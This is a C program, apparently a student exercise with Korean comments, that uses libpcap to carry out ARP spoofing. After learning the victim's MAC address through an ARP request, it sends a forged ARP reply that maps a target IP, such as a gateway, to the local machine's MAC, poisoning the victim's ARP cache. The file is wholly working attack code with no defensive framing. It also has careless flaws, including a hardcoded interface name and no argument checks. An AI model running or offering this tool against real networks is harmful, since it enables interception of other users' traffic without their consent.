#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <uchar.h>

#define send_prot_addr	send_ip
#define trg_HW_addr		trg_hw
#define trg_prot_addr	trg_ip

uint8_t my_ip[4];
uint8_t my_mac[6];
uint8_t send_ip[4];
uint8_t trg_ip[4];
uint8_t send_mac[6];

typedef struct eth_header {
	uint8_t dst_addr[6];   //arp_req:FF~, arp_rep:mac
	uint8_t src_addr[6];
	uint16_t ethet_type;   //arp:0x0806
	unsigned char arp_data[28];
	uint8_t dm[18];
}ETH;

typedef struct arp_header {
	uint16_t hw_type;
	uint16_t prot_type;    //IP4 0x0800
	uint8_t Hlen;          //이더넷 6
	uint8_t Plen;		   //IP4 4
	uint16_t op_code;      //arp_req:1, rep:2
	uint8_t send_HW_addr[6];
	uint8_t send_prot_addr[4];
	uint8_t trg_HW_addr[6];
	uint8_t trg_prot_addr[4];
}ARP;


void get_sender_mac(pcap_t *handle)
{
	struct pcap_pkthdr *header;
	const uint8_t *data;
	while(1) {
		pcap_next_ex(handle, &header, &data);
		if(!memcmp(data+12, "\x08\x06", 2)) {
			printf("Length : %d\n", header->caplen);
			printf("%02x %02x %02x %02x %02x %02x\n", data[0], data[1], data[2], data[3], data[4], data[5]);
			memcpy(send_mac, data +6, 6);
			printf("send_mac: %02x %02x %02x %02x %02x %02x\n", send_mac[0], send_mac[1], send_mac[2], send_mac[3], send_mac[4], send_mac[5]);
			break;
		}
	}
}

void send_arp_packet(pcap_t *handle, int opcode, uint8_t *send_hw, uint8_t *send_ip, uint8_t *trg_hw, uint8_t *trg_ip)
{
	ETH eth;
	memcpy(eth.dst_addr, (opcode == 1) ? "\xFF\xFF\xFF\xFF\xFF\xFF" : trg_hw, 6);
	memcpy(eth.src_addr, send_hw, 6);
	eth.ethet_type = ntohs(0x0806);
	ARP arp;
	arp.hw_type = ntohs(0x0001);
	arp.prot_type = ntohs(0x0800);
	arp.Hlen = 0x06;
	arp.Plen = 0x04;
	arp.op_code = ntohs(opcode);
	memcpy(arp.send_HW_addr, send_hw, 6);
	memcpy(arp.send_prot_addr, send_ip, 4);
	memcpy(arp.trg_HW_addr, (opcode == 1) ? "\x00\x00\x00\x00\x00\x00" : trg_hw, 6);
	memcpy(arp.trg_prot_addr, trg_ip, 4);
	memcpy(eth.arp_data, &arp, sizeof(arp));
	pcap_sendpacket(handle, (const unsigned char*)&eth, sizeof(eth));
}

void find_myip()
{
	struct ifaddrs *ifap, *ifa;
	struct sockaddr_in *sa;
	char *addr;
	int tmp = 0;
	getifaddrs(&ifap);
	for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr->sa_family == AF_INET) {
			sa = (struct sockaddr_in *) ifa->ifa_addr;
		}
	}
	memcpy(my_ip, &(sa->sin_addr.s_addr), 4);
	freeifaddrs(ifap);
}

void find_mymac()
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, "ens33");
	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(my_mac, s.ifr_hwaddr.sa_data, 6);
}


int main(int argc, char* argv[])
{
	char * dev, errbuf[PCAP_ERRBUF_SIZE];
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL)
	{
		fprintf(stderr, "기본 장치를 찾을 수 없습니다 : %s\n", errbuf);
		return (2);
	}
	printf("장치 : %s\n", dev);
	pcap_t * handle;
	handle = pcap_open_live(dev, BUFSIZ, 1, 10000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "%s\n 장치를 열 수 없습니다. : %s\n", dev, errbuf);
		return 2;
	}
	inet_pton(AF_INET, argv[1], send_ip);
	inet_pton(AF_INET, argv[2], trg_ip);
	find_myip();
	find_mymac();
	printf("my_ip: %u.%u.%u.%u\n", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
	printf("my_mac: %x %x %x %x %x %x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
	send_arp_packet(handle, 1, my_mac, my_ip, NULL, send_ip);
	get_sender_mac(handle);
	send_arp_packet(handle, 2, my_mac, trg_ip, send_mac, send_ip);
	return 0;
}

